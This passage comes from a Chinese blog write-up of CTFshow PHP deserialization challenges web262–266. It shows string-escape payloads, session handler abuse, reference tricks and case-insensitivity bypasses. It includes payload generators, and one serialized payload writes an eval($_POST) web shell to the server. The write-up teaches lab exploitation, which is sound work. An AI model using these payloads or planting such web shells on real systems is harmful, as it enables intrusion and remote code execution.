-&lt;p&gt;这里把下面的 username 加上了 123，这里长度与前面的 8 不对应就报错，后面加上的 aaaaaaaa 不影响反序列化的结果&lt;/p&gt;
-&lt;p&gt;为什么上面说有替换猜测是字符串逃逸呢？&lt;/p&gt;
-&lt;p&gt;这里假如我需要更改 passwd 为 admin，不去改动 $passwd 怎么做到呢？&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class demo&amp;#123;
-    public $username = &amp;quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;;
-    public $passwd=&amp;quot;test&amp;quot;;
-&amp;#125;
-$a = new demo();
-echo $b = serialize($a).&amp;quot;\n&amp;quot;;
-echo $c= str_replace(&#39;fuck&#39;, &#39;loveU&#39;,$b).&amp;quot;\n&amp;quot;;
-var_dump(unserialize($c));
-
-
-?&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304133733733.png&#34; alt=&#34;image-20230304133733733&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;看上面的结果，这里 passwd 已经被改为了 admin，很简单的逻辑，在前一个变量后面添加上 &amp;quot;;s:6:&amp;quot;passwd&amp;quot;;s:5:&amp;quot;admin&amp;quot;;}, 这是我们构造的 passwd 预取为 admin 的序列化后的结果，通过&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;str_replace(&#39;fuck&#39;, &#39;loveU&#39;,$b).&amp;quot;\n&amp;quot;;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这一句会讲 fuck 替换为 loveU，每有一个 fuck 就会使得前一个变量的长度加一，当我们长度等于我们构造的 &amp;quot;;s:6:&amp;quot;passwd&amp;quot;;s:5:&amp;quot;admin&amp;quot;;}，这里就会顶替掉原有的&amp;quot;;s:6:&amp;quot;passwd&amp;quot;;s:4:&amp;quot;test&amp;quot;;}&lt;/p&gt;
-&lt;h4 id=&#34;减少&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#减少&#34;&gt;#&lt;/a&gt; 减少&lt;/h4&gt;
-&lt;p&gt;原理还是跟增加得到一样，不过是我们构造的字符添加的位置不同&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class demo&amp;#123;
-    public $username = &amp;quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&amp;quot;;
-    public $passwd=&amp;quot;test&amp;quot;;
-&amp;#125;
-$a = new demo();
-echo $b = serialize($a);
-$c= str_replace(&#39;fuck&#39;, &#39;you&#39;,$b).&amp;quot;\n&amp;quot;;
-echo $c;
-$d=$c.&amp;quot;\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;;
-echo $d.&amp;quot;\n&amp;quot;;
-var_dump(unserialize($d));
-echo strlen(&amp;quot;youyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyouyou\&amp;quot;;s:6:\&amp;quot;passwd\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304135322961.png&#34; alt=&#34;image-20230304135322961&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;现在做这个就简单了&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class message&amp;#123;
-    public $from;
-    public $msg;
-    public $to;
-    public $token=&#39;admin&#39;;
-    public function __construct($f,$m,$t)&amp;#123;
-        $this-&amp;gt;from = $f;
-        $this-&amp;gt;msg = $m;
-        $this-&amp;gt;to = $t;
-    &amp;#125;
-&amp;#125;
-$f = &amp;quot;1&amp;quot;;
-$m = &amp;quot;1&amp;quot;;
-$t = &amp;quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\&amp;quot;;s:5:\&amp;quot;token\&amp;quot;;s:5:\&amp;quot;admin\&amp;quot;;&amp;#125;&amp;quot;;
-$a = new message($f,$m,$t);
-
-echo serialize($a).&amp;quot;\n&amp;quot;;
-echo base64_encode(str_replace(&#39;fuck&#39;, &#39;loveU&#39;,serialize($a))).&amp;quot;\n&amp;quot;;
-echo urlencode(serialize($a)).&amp;quot;\n&amp;quot;;
-echo strlen(&amp;quot;1loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&amp;quot;);
-/*
-O:7:&amp;quot;message&amp;quot;:4:&amp;#123;s:4:&amp;quot;from&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:3:&amp;quot;msg&amp;quot;;s:1:&amp;quot;1&amp;quot;;s:2:&amp;quot;to&amp;quot;;s:136:&amp;quot;1fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&amp;quot;;s:5:&amp;quot;token&amp;quot;;s:5:&amp;quot;admin&amp;quot;;&amp;#125;&amp;quot;;s:5:&amp;quot;token&amp;quot;;s:5:&amp;quot;admin&amp;quot;;&amp;#125;
-Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzY6IjFsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVUiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30=
-O%3A7%3A%22message%22%3A4%3A%7Bs%3A4%3A%22from%22%3Bs%3A1%3A%221%22%3Bs%3A3%3A%22msg%22%3Bs%3A1%3A%221%22%3Bs%3A2%3A%22to%22%3Bs%3A136%3A%221fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D%22%3Bs%3A5%3A%22token%22%3Bs%3A5%3A%22admin%22%3B%7D
-136
-*/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304125625217.png&#34; alt=&#34;image-20230304125625217&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web263&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web263&#34;&gt;#&lt;/a&gt; web263&lt;/h2&gt;
-&lt;p&gt;这题考察的是 Session 反序列化，扫描目录能拿到 www.zip 文件&lt;/p&gt;
-&lt;p&gt;首先是 index.php 文件&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-session_start();
-//超过5次禁止登陆
-if (isset($_SESSION[&#39;limit&#39;])) &amp;#123;
-	$_SESSION[&#39;limti&#39;] &amp;gt; 5 ? die(&amp;quot;登陆失败次数超过限制&amp;quot;) : $_SESSION[&#39;limit&#39;] = base64_decode($_COOKIE[&#39;limit&#39;]);
-	$_COOKIE[&#39;limit&#39;] = base64_encode(base64_decode($_COOKIE[&#39;limit&#39;]) + 1);
-&amp;#125; else &amp;#123;
-	setcookie(&amp;quot;limit&amp;quot;, base64_encode(&#39;1&#39;));
-	$_SESSION[&#39;limit&#39;] = 1;
-&amp;#125;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;])&lt;/code&gt;  来控制 session 的值&lt;/p&gt;
-&lt;p&gt;在 inc.php 文件中，首先这里把 session.serialize_handler 设置为了 php, 和 index.php 不一致，可以利用来进行反序列化&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-ini_set(&#39;display_errors&#39;, 0);
-ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
-
-date_default_timezone_set(&amp;quot;Asia/Shanghai&amp;quot;);
-session_start();
-use \CTFSHOW\CTFSHOW; 
-require_once &#39;CTFSHOW.php&#39;;
-$db = new CTFSHOW([
-    &#39;database_type&#39; =&amp;gt; &#39;mysql&#39;,
-    &#39;database_name&#39; =&amp;gt; &#39;web&#39;,
-    &#39;server&#39; =&amp;gt; &#39;localhost&#39;,
-    &#39;username&#39; =&amp;gt; &#39;root&#39;,
-    &#39;password&#39; =&amp;gt; &#39;root&#39;,
-    &#39;charset&#39; =&amp;gt; &#39;utf8&#39;,
-    &#39;port&#39; =&amp;gt; 3306,
-    &#39;prefix&#39; =&amp;gt; &#39;&#39;,
-    &#39;option&#39; =&amp;gt; [
-        PDO::ATTR_CASE =&amp;gt; PDO::CASE_NATURAL
-    ]
-]);
-
-// sql注入检查
-function checkForm($str)&amp;#123;
-    if(!isset($str))&amp;#123;
-        return true;
-    &amp;#125;else&amp;#123;
-    return preg_match(&amp;quot;/select|update|drop|union|and|or|ascii|if|sys|substr|sleep|from|where|0x|hex|bin|char|file|ord|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\\|\&amp;amp;|\*|\(|\)|\（|\）|\+|\=|\[|\]|\;|\:|\&#39;|\&amp;quot;|\&amp;lt;|\,|\&amp;gt;|\?/i&amp;quot;,$str);
-    &amp;#125;
-&amp;#125;
-
-
-class User&amp;#123;
-    public $username;
-    public $password;
-    public $status;
-    function __construct($username,$password)&amp;#123;
-        $this-&amp;gt;username = $username;
-        $this-&amp;gt;password = $password;
-    &amp;#125;
-    function setStatus($s)&amp;#123;
-        $this-&amp;gt;status=$s;
-    &amp;#125;
-    function __destruct()&amp;#123;
-        file_put_contents(&amp;quot;log-&amp;quot;.$this-&amp;gt;username, &amp;quot;使用&amp;quot;.$this-&amp;gt;password.&amp;quot;登陆&amp;quot;.($this-&amp;gt;status?&amp;quot;成功&amp;quot;:&amp;quot;失败&amp;quot;).&amp;quot;----&amp;quot;.date_create()-&amp;gt;format(&#39;Y-m-d H:i:s&#39;));
-    &amp;#125;
-&amp;#125;
-
-/*生成唯一标志
-*标准的UUID格式为：xxxxxxxx-xxxx-xxxx-xxxxxx-xxxxxxxxxx(8-4-4-4-12)
-*/
-
-function  uuid()  
-&amp;#123;  
-    $chars = md5(uniqid(mt_rand(), true));  
-    $uuid = substr ( $chars, 0, 8 ) . &#39;-&#39;
-            . substr ( $chars, 8, 4 ) . &#39;-&#39; 
-            . substr ( $chars, 12, 4 ) . &#39;-&#39;
-            . substr ( $chars, 16, 4 ) . &#39;-&#39;
-            . substr ( $chars, 20, 12 );  
-    return $uuid ;  
-&amp;#125;  
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里可以反序列化后可以写文件&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class User&amp;#123;
-    public $username=&#39;2.php&#39;;
-    public $password = &#39;&amp;lt;?php phpinfo();eval($_POST[1]);?&amp;gt;&#39;;
-&amp;#125;
-$a=new User();
-
-echo  base64_encode(&amp;quot;|&amp;quot;.serialize($a));
-//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWzFdKTs/PiI7fQ==
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183010822.png&#34; alt=&#34;image-20230304183010822&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;然后访问一下 check.php&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183043807.png&#34; alt=&#34;image-20230304183043807&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;最后访问 log-2.php&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230304183112672.png&#34; alt=&#34;image-20230304183112672&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web264&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web264&#34;&gt;#&lt;/a&gt; web264&lt;/h2&gt;
-&lt;p&gt;index.php&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-session_start();
-
-class message&amp;#123;
-    public $from;
-    public $msg;
-    public $to;
-    public $token=&#39;user&#39;;
-    public function __construct($f,$m,$t)&amp;#123;
-        $this-&amp;gt;from = $f;
-        $this-&amp;gt;msg = $m;
-        $this-&amp;gt;to = $t;
-    &amp;#125;
-&amp;#125;
-
-$f = $_GET[&#39;f&#39;];
-$m = $_GET[&#39;m&#39;];
-$t = $_GET[&#39;t&#39;];
-
-if(isset($f) &amp;amp;&amp;amp; isset($m) &amp;amp;&amp;amp; isset($t))&amp;#123;
-    $msg = new message($f,$m,$t);
-    $umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));
-    $_SESSION[&#39;msg&#39;]=base64_encode($umsg);
-    echo &#39;Your message has been sent&#39;;
-&amp;#125;
-
-highlight_file(__FILE__);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;message.php&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-session_start();
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-
-class message&amp;#123;
-    public $from;
-    public $msg;
-    public $to;
-    public $token=&#39;user&#39;;
-    public function __construct($f,$m,$t)&amp;#123;
-        $this-&amp;gt;from = $f;
-        $this-&amp;gt;msg = $m;
-        $this-&amp;gt;to = $t;
-    &amp;#125;
-&amp;#125;
-
-if(isset($_COOKIE[&#39;msg&#39;]))&amp;#123;
-    $msg = unserialize(base64_decode($_SESSION[&#39;msg&#39;]));
-    if($msg-&amp;gt;token==&#39;admin&#39;)&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;看了半天才反应过来，这里少了一个 setcookie (&#39;msg&#39;,base64_encode ($umsg));，做法稍微有一点改动&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110134330.png&#34; alt=&#34;image-20230305110134330&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;首先在首页将 payload 传入，payload 为什么是这样的详看 262，这里访问后会有一个 session，带着这个 session 访问 message 即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305110259089.png&#34; alt=&#34;image-20230305110259089&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;还得加上 msg&lt;/p&gt;
-&lt;h2 id=&#34;web265&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web265&#34;&gt;#&lt;/a&gt; web265&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-include(&#39;flag.php&#39;);
-highlight_file(__FILE__);
-class ctfshowAdmin&amp;#123;
-    public $token;
-    public $password;
-
-    public function __construct($t,$p)&amp;#123;
-        $this-&amp;gt;token=$t;
-        $this-&amp;gt;password = $p;
-    &amp;#125;
-    public function login()&amp;#123;
-        return $this-&amp;gt;token===$this-&amp;gt;password;
-    &amp;#125;
-&amp;#125;
-
-$ctfshow = unserialize($_GET[&#39;ctfshow&#39;]);
-$ctfshow-&amp;gt;token=md5(mt_rand());
-
-if($ctfshow-&amp;gt;login())&amp;#123;
-    echo $flag;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在本题中，token 的值在最后会改变，这里修改 passwd 的值为 token 的引用即可&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class ctfshowAdmin&amp;#123;
-    public $token;
-    public $password;
-
-    public function __construct()&amp;#123;
-        $this-&amp;gt;password = &amp;amp;$this-&amp;gt;token;
-    &amp;#125;
-&amp;#125;
-
-$a = new ctfshowAdmin();
-echo urlencode(serialize($a));
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305122631830.png&#34; alt=&#34;image-20230305122631830&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web266&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web266&#34;&gt;#&lt;/a&gt; web266&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-
-include(&#39;flag.php&#39;);
-$cs = file_get_contents(&#39;php://input&#39;);
-
-class ctfshow&amp;#123;
-    public $username=&#39;xxxxxx&#39;;
-    public $password=&#39;xxxxxx&#39;;
-    public function __construct($u,$p)&amp;#123;
-        $this-&amp;gt;username=$u;
-        $this-&amp;gt;password=$p;
-    &amp;#125;
-    public function login()&amp;#123;
-        return $this-&amp;gt;username===$this-&amp;gt;password;
-    &amp;#125;
-    public function __toString()&amp;#123;
-        return $this-&amp;gt;username;
-    &amp;#125;
-    public function __destruct()&amp;#123;
-        global $flag;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-$ctfshowo=@unserialize($cs);
-if(preg_match(&#39;/ctfshow/&#39;, $cs))&amp;#123;
-    throw new Exception(&amp;quot;Error $ctfshowo&amp;quot;,1);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个题换了一种传参的方式，file_get_contents (&#39;php://input&#39;);，通过使用伪协议读取 post 数据，然后又利用了一个大小写不敏感&lt;/p&gt;
-&lt;p&gt;pyaload：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class ctfshow&amp;#123;
-&amp;#125;
-
-$a = new ctfshow();
-echo serialize($a);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230305134607238.png&#34; alt=&#34;image-20230305134607238&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;后面的跟前面的区别稍微有点大，另起一篇做一个简单的总结&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
